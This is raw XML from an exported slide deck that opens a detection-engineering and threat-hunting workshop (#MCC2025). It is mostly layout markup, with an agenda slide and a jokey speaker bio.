name="Google Shape;135;p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42" name="Google Shape;142;p9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43" name="Google Shape;143;p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50" name="Google Shape;150;p9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51" name="Google Shape;151;p9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7" name="Google Shape;157;p10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8" name="Google Shape;158;p10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9" name="Google Shape;159;p10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0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61" name="Google Shape;161;p10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162" name="Google Shape;162;p1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69" name="Google Shape;169;p10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170" name="Google Shape;170;p1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6" name="Google Shape;176;p1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77" name="Google Shape;177;p10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178" name="Google Shape;178;p10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81" name="Google Shape;181;p10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82" name="Google Shape;182;p10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83" name="Google Shape;183;p10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7" name="Google Shape;187;p11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8" name="Google Shape;188;p11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9" name="Google Shape;189;p11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0" name="Google Shape;190;p11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1" name="Google Shape;191;p11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2" name="Google Shape;192;p11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5" name="Google Shape;195;p12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6" name="Google Shape;196;p12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7" name="Google Shape;197;p12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8" name="Google Shape;198;p12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9" name="Google Shape;199;p12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0" name="Google Shape;200;p12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1" name="Google Shape;201;p12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2" name="Google Shape;202;p12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3" name="Google Shape;203;p12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4" name="Google Shape;204;p12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5" name="Google Shape;205;p12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12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12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8" name="Google Shape;208;p12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9" name="Google Shape;209;p12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0" name="Google Shape;210;p12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12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2" name="Google Shape;212;p12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2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2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17" name="Google Shape;217;p13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18" name="Google Shape;218;p13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19" name="Google Shape;219;p13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20" name="Google Shape;220;p13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4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256" name="Google Shape;256;p14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58" name="Google Shape;258;p14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59" name="Google Shape;259;p14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5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262" name="Google Shape;262;p15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66" name="Google Shape;266;p15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5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268" name="Google Shape;268;p15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5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5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5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2" name="Google Shape;272;p15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5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5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5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78" name="Google Shape;278;p16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279" name="Google Shape;279;p16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280" name="Google Shape;280;p16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16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85" name="Google Shape;285;p16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7"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="48372" l="72419" r="0" t="25661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7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289" name="Google Shape;289;p17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0" name="Google Shape;290;p17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1" name="Google Shape;291;p17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292" name="Google Shape;292;p17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293" name="Google Shape;293;p17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4" name="Google Shape;294;p17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5" name="Google Shape;295;p17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6" name="Google Shape;296;p17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7" name="Google Shape;297;p17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8" name="Google Shape;298;p17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9" name="Google Shape;299;p17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00" name="Google Shape;300;p17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1" name="Google Shape;301;p17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02" name="Google Shape;302;p17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3" name="Google Shape;303;p17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8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06" name="Google Shape;306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9" name="Google Shape;309;p18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10" name="Google Shape;310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3" name="Google Shape;313;p18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14" name="Google Shape;314;p18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6" name="Google Shape;316;p18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17" name="Google Shape;317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20" name="Google Shape;320;p18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1" name="Google Shape;321;p18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2" name="Google Shape;322;p18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3" name="Google Shape;323;p18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4" name="Google Shape;324;p18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5" name="Google Shape;325;p18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6" name="Google Shape;326;p18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19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29" name="Google Shape;329;p19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3" name="Google Shape;333;p19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334" name="Google Shape;334;p19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335" name="Google Shape;335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/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="6521" r="6520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/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="6521" r="6520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" name="Google Shape;344;p19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45" name="Google Shape;345;p1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4" name="Google Shape;35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2" name="Google Shape;36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3" name="Google Shape;36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8" name="Google Shape;36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3" name="Google Shape;373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4" name="Google Shape;374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9" name="Google Shape;379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1" name="Google Shape;391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2" name="Google Shape;392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7" name="Google Shape;397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1" name="Google Shape;401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2" name="Google Shape;402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3" name="Google Shape;403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9" name="Google Shape;409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0" name="Google Shape;410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1" name="Google Shape;411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2" name="Google Shape;412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3" name="Google Shape;413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2" name="Google Shape;422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5" name="Google Shape;42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7" name="Google Shape;427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5" name="Google Shape;43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8" name="Google Shape;438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9" name="Google Shape;449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58" name="Google Shape;458;p42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9" name="Google Shape;459;p42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60" name="Google Shape;460;p42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461" name="Google Shape;461;p42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462" name="Google Shape;462;p4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63" name="Google Shape;463;p4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64" name="Google Shape;464;p4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65" name="Google Shape;465;p4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66" name="Google Shape;466;p4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469" name="Google Shape;469;p42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470" name="Google Shape;470;p4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74" name="Google Shape;474;p4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75" name="Google Shape;475;p4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76" name="Google Shape;476;p4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477" name="Google Shape;477;p42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478" name="Google Shape;478;p4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79" name="Google Shape;479;p4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80" name="Google Shape;480;p4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82" name="Google Shape;482;p4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83" name="Google Shape;483;p4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84" name="Google Shape;484;p4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43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487" name="Google Shape;487;p43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488" name="Google Shape;488;p43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89" name="Google Shape;489;p43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90" name="Google Shape;490;p43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91" name="Google Shape;491;p43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92" name="Google Shape;492;p43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93" name="Google Shape;493;p43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494" name="Google Shape;494;p43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495" name="Google Shape;495;p43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96" name="Google Shape;496;p43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497" name="Google Shape;497;p43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498" name="Google Shape;498;p43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4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01" name="Google Shape;501;p44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502" name="Google Shape;502;p44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03" name="Google Shape;503;p44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04" name="Google Shape;504;p44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05" name="Google Shape;505;p44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06" name="Google Shape;506;p44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507" name="Google Shape;507;p44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508" name="Google Shape;508;p44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44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5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2" name="Google Shape;512;p45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513" name="Google Shape;513;p45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514" name="Google Shape;514;p45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5" name="Google Shape;515;p45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16" name="Google Shape;516;p45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517" name="Google Shape;517;p45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18" name="Google Shape;518;p45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19" name="Google Shape;519;p45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20" name="Google Shape;520;p45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21" name="Google Shape;521;p45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22" name="Google Shape;522;p45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23" name="Google Shape;523;p45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524" name="Google Shape;524;p45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25" name="Google Shape;525;p45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46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528" name="Google Shape;528;p46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32" name="Google Shape;532;p46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533" name="Google Shape;533;p46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34" name="Google Shape;534;p46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35" name="Google Shape;535;p46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7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38" name="Google Shape;538;p47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539" name="Google Shape;539;p47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40" name="Google Shape;540;p47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41" name="Google Shape;541;p47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42" name="Google Shape;542;p47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43" name="Google Shape;543;p47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44" name="Google Shape;544;p47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45" name="Google Shape;545;p47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46" name="Google Shape;546;p47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47" name="Google Shape;547;p47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48" name="Google Shape;548;p47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49" name="Google Shape;549;p47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50" name="Google Shape;550;p47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551" name="Google Shape;551;p47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552" name="Google Shape;552;p47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7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8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56" name="Google Shape;556;p48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8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58" name="Google Shape;558;p48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59" name="Google Shape;559;p48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60" name="Google Shape;560;p48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61" name="Google Shape;561;p48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62" name="Google Shape;562;p48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3" name="Google Shape;563;p48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4" name="Google Shape;564;p48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48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566" name="Google Shape;566;p48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67" name="Google Shape;567;p48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8" name="Google Shape;568;p48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9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571" name="Google Shape;571;p49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9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9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4" name="Google Shape;574;p49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575" name="Google Shape;575;p49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576" name="Google Shape;576;p49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77" name="Google Shape;577;p49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78" name="Google Shape;578;p49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79" name="Google Shape;579;p49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80" name="Google Shape;580;p49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581" name="Google Shape;581;p49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582" name="Google Shape;582;p4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3" name="Google Shape;583;p4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4" name="Google Shape;584;p4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5" name="Google Shape;585;p4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6" name="Google Shape;586;p4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7" name="Google Shape;587;p4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8" name="Google Shape;588;p4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589" name="Google Shape;589;p49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590" name="Google Shape;590;p4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1" name="Google Shape;591;p4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2" name="Google Shape;592;p4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3" name="Google Shape;593;p4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4" name="Google Shape;594;p4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5" name="Google Shape;595;p4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6" name="Google Shape;596;p4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597" name="Google Shape;597;p49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598" name="Google Shape;598;p49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9" name="Google Shape;599;p49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00" name="Google Shape;600;p49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0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03" name="Google Shape;603;p50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04" name="Google Shape;604;p50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05" name="Google Shape;605;p50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06" name="Google Shape;606;p50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7" name="Google Shape;607;p50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608" name="Google Shape;608;p50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609" name="Google Shape;609;p5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0" name="Google Shape;610;p5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1" name="Google Shape;611;p5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2" name="Google Shape;612;p5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3" name="Google Shape;613;p5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4" name="Google Shape;614;p5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5" name="Google Shape;615;p5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16" name="Google Shape;616;p50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617" name="Google Shape;617;p5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8" name="Google Shape;618;p5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9" name="Google Shape;619;p5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0" name="Google Shape;620;p5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1" name="Google Shape;621;p5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2" name="Google Shape;622;p5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3" name="Google Shape;623;p5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625" name="Google Shape;625;p50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6" name="Google Shape;626;p50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7" name="Google Shape;627;p50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628" name="Google Shape;628;p50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629" name="Google Shape;629;p50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630" name="Google Shape;630;p50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1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33" name="Google Shape;633;p51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34" name="Google Shape;634;p51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35" name="Google Shape;635;p51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36" name="Google Shape;636;p51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37" name="Google Shape;637;p51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38" name="Google Shape;638;p51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39" name="Google Shape;639;p51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2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42" name="Google Shape;642;p52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43" name="Google Shape;643;p52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44" name="Google Shape;644;p52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45" name="Google Shape;645;p52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46" name="Google Shape;646;p52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47" name="Google Shape;647;p52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8" name="Google Shape;648;p52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49" name="Google Shape;649;p52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50" name="Google Shape;650;p52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651" name="Google Shape;651;p52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2" name="Google Shape;652;p52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3" name="Google Shape;653;p52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4" name="Google Shape;654;p52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5" name="Google Shape;655;p52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6" name="Google Shape;656;p52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7" name="Google Shape;657;p52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8" name="Google Shape;658;p52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9" name="Google Shape;659;p52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52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1" name="Google Shape;661;p52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3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64" name="Google Shape;664;p53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65" name="Google Shape;665;p53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666" name="Google Shape;666;p53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667" name="Google Shape;667;p53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68" name="Google Shape;668;p53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69" name="Google Shape;669;p53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0" name="Google Shape;670;p53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1" name="Google Shape;671;p53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2" name="Google Shape;672;p53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3" name="Google Shape;673;p53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4" name="Google Shape;674;p53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5" name="Google Shape;675;p53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6" name="Google Shape;676;p53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7" name="Google Shape;677;p53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8" name="Google Shape;678;p53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9" name="Google Shape;679;p53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80" name="Google Shape;680;p53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81" name="Google Shape;681;p53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82" name="Google Shape;682;p53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83" name="Google Shape;683;p53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84" name="Google Shape;684;p53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85" name="Google Shape;685;p53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86" name="Google Shape;686;p53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87" name="Google Shape;687;p53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88" name="Google Shape;688;p53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89" name="Google Shape;689;p53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90" name="Google Shape;690;p53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91" name="Google Shape;691;p53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92" name="Google Shape;692;p53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93" name="Google Shape;693;p53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94" name="Google Shape;694;p53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95" name="Google Shape;695;p53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96" name="Google Shape;696;p53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97" name="Google Shape;697;p53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98" name="Google Shape;698;p53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99" name="Google Shape;699;p53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00" name="Google Shape;700;p53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oogle Shape;702;p54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703" name="Google Shape;703;p54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04" name="Google Shape;704;p54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05" name="Google Shape;705;p54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06" name="Google Shape;706;p54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8" name="Google Shape;708;p55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709" name="Google Shape;709;p55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0" name="Google Shape;710;p55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1" name="Google Shape;711;p55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2" name="Google Shape;712;p55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13" name="Google Shape;713;p55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p55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715" name="Google Shape;715;p55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55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55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55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19" name="Google Shape;719;p55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55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55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p55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6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25" name="Google Shape;725;p56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726" name="Google Shape;726;p56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727" name="Google Shape;727;p56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8" name="Google Shape;728;p56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9" name="Google Shape;729;p56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0" name="Google Shape;730;p56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1" name="Google Shape;731;p56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32" name="Google Shape;732;p56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" name="Google Shape;734;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="48372" l="72419" r="0" t="25661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7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736" name="Google Shape;736;p57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37" name="Google Shape;737;p57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38" name="Google Shape;738;p57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739" name="Google Shape;739;p57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740" name="Google Shape;740;p57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1" name="Google Shape;741;p57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42" name="Google Shape;742;p57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43" name="Google Shape;743;p57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44" name="Google Shape;744;p57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45" name="Google Shape;745;p57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46" name="Google Shape;746;p57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47" name="Google Shape;747;p57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48" name="Google Shape;748;p57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49" name="Google Shape;749;p57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50" name="Google Shape;750;p57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2" name="Google Shape;752;p58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753" name="Google Shape;753;p5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54" name="Google Shape;754;p5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55" name="Google Shape;755;p5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56" name="Google Shape;756;p58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757" name="Google Shape;757;p5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58" name="Google Shape;758;p5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59" name="Google Shape;759;p5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760" name="Google Shape;760;p58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761" name="Google Shape;761;p58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62" name="Google Shape;762;p58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763" name="Google Shape;763;p58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764" name="Google Shape;764;p5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65" name="Google Shape;765;p5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66" name="Google Shape;766;p5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67" name="Google Shape;767;p58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68" name="Google Shape;768;p58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69" name="Google Shape;769;p58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70" name="Google Shape;770;p58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71" name="Google Shape;771;p58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72" name="Google Shape;772;p58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73" name="Google Shape;773;p58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5" name="Google Shape;775;p59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776" name="Google Shape;776;p59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77" name="Google Shape;777;p59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78" name="Google Shape;778;p59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79" name="Google Shape;779;p59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80" name="Google Shape;780;p59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781" name="Google Shape;781;p59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782" name="Google Shape;782;p5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5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5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5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59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="6521" r="6520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59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="6521" r="6520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5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1" name="Google Shape;791;p59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792" name="Google Shape;792;p5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3" name="Google Shape;793;p5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4" name="Google Shape;794;p5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5" name="Google Shape;795;p5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6" name="Google Shape;796;p5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7" name="Google Shape;797;p5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8" name="Google Shape;798;p5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1" name="Google Shape;801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6" name="Google Shape;806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9" name="Google Shape;809;p6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0" name="Google Shape;810;p6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5" name="Google Shape;815;p6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0" name="Google Shape;820;p6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21" name="Google Shape;821;p6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6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6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6" name="Google Shape;826;p6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0" name="Google Shape;830;p7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1" name="Google Shape;831;p7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2" name="Google Shape;832;p7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3" name="Google Shape;833;p7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4" name="Google Shape;834;p7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5" name="Google Shape;835;p7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8" name="Google Shape;838;p7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9" name="Google Shape;839;p7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2" name="Google Shape;842;p7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3" name="Google Shape;843;p7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4" name="Google Shape;844;p7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5" name="Google Shape;845;p7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8" name="Google Shape;848;p7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9" name="Google Shape;849;p7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0" name="Google Shape;850;p7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1" name="Google Shape;851;p7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2" name="Google Shape;852;p7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3" name="Google Shape;853;p7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6" name="Google Shape;856;p7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7" name="Google Shape;857;p7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8" name="Google Shape;858;p7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9" name="Google Shape;859;p7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0" name="Google Shape;860;p7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7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7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7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6" name="Google Shape;866;p7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9" name="Google Shape;869;p7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70" name="Google Shape;870;p7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71" name="Google Shape;871;p7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2" name="Google Shape;872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3" name="Google Shape;873;p7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4" name="Google Shape;874;p7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7" name="Google Shape;877;p7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7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7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0" name="Google Shape;880;p7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81" name="Google Shape;881;p7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2" name="Google Shape;882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3" name="Google Shape;883;p7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84" name="Google Shape;884;p7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85" name="Google Shape;885;p7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8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0" name="Google Shape;890;p8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1" name="Google Shape;891;p8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2" name="Google Shape;892;p8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3" name="Google Shape;893;p8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8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5" name="Google Shape;895;p8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6" name="Google Shape;896;p8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7" name="Google Shape;897;p8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8" name="Google Shape;898;p8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68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4" name="Google Shape;45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55" name="Google Shape;45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81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="699973" y="734275"/>
            <a:ext cx="69102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DETECTION_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ENGINEERING</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="904" name="Google Shape;904;p81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WELCOME TO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#MCC2025</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="905" name="Google Shape;905;p81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29/11/2025</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="906" name="Google Shape;906;p81"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="699974" y="4014458"/>
            <a:ext cx="61434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Dissecting Adversaries | Mapping Capabilities | Building Defenses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82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THE PLAN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FOR TODAY</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="912" name="Google Shape;912;p82"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5960893" y="1195589"/>
            <a:ext cx="547211" cy="104394"/>
            <a:chOff x="238125" y="2176075"/>
            <a:chExt cx="7143750" cy="1362850"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="913" name="Google Shape;913;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1625925" y="3089625"/>
              <a:ext cx="4368150" cy="449300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="17972" w="174726">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="17972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="174725" y="17972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1747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14" name="Google Shape;914;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1161650" y="2635350"/>
              <a:ext cx="464300" cy="454300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18172" w="18572">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18572" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18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15" name="Google Shape;915;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="702375" y="2176075"/>
              <a:ext cx="459300" cy="459300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18372" w="18372">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="18371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18372" y="18371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18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16" name="Google Shape;916;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="238125" y="2635350"/>
              <a:ext cx="464275" cy="454300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18172" w="18571">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18571" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185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17" name="Google Shape;917;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6922575" y="2635350"/>
              <a:ext cx="459300" cy="454300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18172" w="18372">
                  <a:moveTo>
                    <a:pt x="1" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18372" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18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18" name="Google Shape;918;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6458325" y="2176075"/>
              <a:ext cx="464275" cy="459300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18372" w="18571">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="18371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18571" y="18371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185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19" name="Google Shape;919;p82"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5994050" y="2635350"/>
              <a:ext cx="464300" cy="454300"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" h="18172" w="18572">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18571" y="18171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="185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920" name="Google Shape;920;p82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500"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>8-HOUR JOURNEY TO DETECTION AND THREAT HUNTING FUNDAMENTALS!</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="921" name="Google Shape;921;p82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Detection Engineering fundamentals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Threat intelligence &amp; MITRE ATT&amp;CK mapping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Log analysis and pattern recognition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22" name="Google Shape;922;p82"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5712456" y="224490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/>
              <a:t>✓ Writing detection rules (Wazuh &amp; Velociraptor)</a:t>
            </a:r>
            <a:endParaRPr sz="9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/>
              <a:t>✓ Testing and validating detections</a:t>
            </a:r>
            <a:endParaRPr sz="9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/>
              <a:t>✓ Threat hunting methodology</a:t>
            </a:r>
            <a:endParaRPr sz="9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/>
              <a:t>✓ Writing professional detection reports</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="950"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="9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SzPts val="1000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr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83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928" name="Google Shape;928;p83" title="IMG_20181111_162539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188" l="0" r="0" t="5197"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="744050" y="1723797"/>
            <a:ext cx="3981548" cy="2675900"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="929" name="Google Shape;929;p83"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="744050" y="1410850"/>
            <a:ext cx="4043000" cy="2081375"/>
            <a:chOff x="744050" y="1654675"/>
            <a:chExt cx="4043000" cy="2081375"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="930" name="Google Shape;930;p83"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="744050" y="1945050"/>
              <a:ext cx="4043000" cy="1791000"/>
              <a:chOff x="744050" y="1837975"/>
              <a:chExt cx="4043000" cy="1791000"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="931" name="Google Shape;931;p83"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="1226975" y="2436358"/>
                <a:ext cx="392400" cy="40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32" name="Google Shape;932;p83"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="744050" y="3236575"/>
                <a:ext cx="741900" cy="392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33" name="Google Shape;933;p83"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="1486000" y="2351575"/>
                <a:ext cx="765000" cy="88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34" name="Google Shape;934;p83"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="3617350" y="1837975"/>
                <a:ext cx="1169700" cy="1006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sp>
          <p:nvSpPr>
            <p:cNvPr id="935" name="Google Shape;935;p83"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1005100" y="1654675"/>
              <a:ext cx="3713100" cy="900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936" name="Google Shape;936;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5333527" y="764389"/>
            <a:ext cx="33942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C:\&gt; net user /domain neurose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937" name="Google Shape;937;p83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HAZIQ ASHROFIE  @ NEUROSE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CYBERSEC ENGINEER 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&gt;5 YEARS EXP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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>PEOPLE HIRE ME TO FILL THE DEI HEADCOUNT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>!... PROBABLY…”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83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4804625" y="1723800"/>
            <a:ext cx="29601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Security engineer who didn’t choose the SOC life—the SOC life kidnapped me, traumatized me, and sent me into threat hunting as therapy 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939" name="Google Shape;939;p83"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4804625" y="3443900"/>
            <a:ext cx="25935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“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1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I do threat hunting, not because I have to, but because someone needs to stop the adversaries from embarrassing themselves.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1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”</a:t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4" name="Google Shape;944;p84"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="1917000"/>
            <a:ext cx="2846403" cy="3226550"/>
            <a:chOff x="0" y="1917000"/>
            <a:chExt cx="2846403" cy="3226550"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="945" name="Google Shape;945;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="191700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46" name="Google Shape;946;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="583203" y="219527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47" name="Google Shape;947;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406231" y="2863118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48" name="Google Shape;948;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="3709850"/>
              <a:ext cx="2263200" cy="1433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49" name="Google Shape;949;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="406225" y="3904091"/>
              <a:ext cx="2263200" cy="123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950" name="Google Shape;950;p84"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3039975" y="1917000"/>
            <a:ext cx="6103900" cy="3226630"/>
            <a:chOff x="3039975" y="1917000"/>
            <a:chExt cx="6103900" cy="3226630"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="951" name="Google Shape;951;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="1917000"/>
              <a:ext cx="61038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2" name="Google Shape;952;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3039975" y="3949323"/>
              <a:ext cx="1851000" cy="119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3" name="Google Shape;953;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5802775" y="1917000"/>
              <a:ext cx="3341100" cy="286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4" name="Google Shape;954;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="2475475"/>
              <a:ext cx="2187000" cy="1661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5" name="Google Shape;955;p84"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5730500" y="3793330"/>
              <a:ext cx="2219100" cy="135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6" name="Google Shape;956;p84"/>
